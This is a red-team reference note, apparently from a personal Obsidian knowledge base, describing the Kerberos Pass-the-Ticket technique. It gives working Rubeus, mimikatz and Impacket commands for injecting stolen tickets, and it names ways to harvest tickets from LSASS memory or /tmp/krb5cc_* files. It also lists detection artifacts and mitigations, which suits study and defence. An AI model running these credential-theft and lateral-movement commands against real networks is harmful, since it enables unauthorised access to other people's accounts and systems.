---
title: Pass-the-Ticket
aliases: ["Pass the Ticket", "PtT", "ticket injection"]
type: technique
domain: [red-team]
attack_tactic: [lateral-movement, credential-access]
tags: [type/technique, domain/red-team, attack/lateral-movement, proto/kerberos]
source: "[[Source - zer1t0 - Attacking Active Directory]]"
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[TGT vs TGS]]", "[[LSASS Dumping]]", "[[Overpass-the-Hash]]", "[[Linux in AD]]", "[[Golden Ticket]]"]
created: 2026-06-06
updated: 2026-06-06
---

# Pass-the-Ticket

> [!summary] One-liner
> Steal an existing Kerberos ticket (TGT or ST) and inject it into your session to authenticate as that user.

## Concept abused
Kerberos tickets are bearer credentials — whoever holds a valid TGT/ST can use it until it expires. Tickets live in [[LSASS]] memory (Windows) or ccache files (Linux).

## Prerequisites
- A stolen ticket: `.kirbi`/base64 (Windows) or `.ccache` (Linux).

## Commands & tools
```powershell
# Rubeus / mimikatz - inject into current session
Rubeus.exe ptt /ticket:<base64-or-path.kirbi>
# mimikatz
kerberos::ptt ticket.kirbi
```
```bash
# Linux / Impacket - point KRB5CCNAME at the ccache
export KRB5CCNAME=/tmp/ticket.ccache
psexec.py -k -no-pass contoso.local/user@host
```
Harvest tickets first with `sekurlsa::tickets /export` (see [[LSASS Dumping]]) or steal `/tmp/krb5cc_*` ([[Linux in AD]]).

## Detection / artifacts
Ticket used from a host that never requested it; TGT/ST without a preceding AS/TGS request; anomalous source.

## Mitigation
Short ticket lifetimes, Credential Guard, Protected Users (limits TGT lifetime), least privilege.

## Related
- Forged-ticket variants: [[Golden Ticket]] / [[Silver Ticket]]; from-hash variant: [[Overpass-the-Hash]].

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "Pass the Ticket"
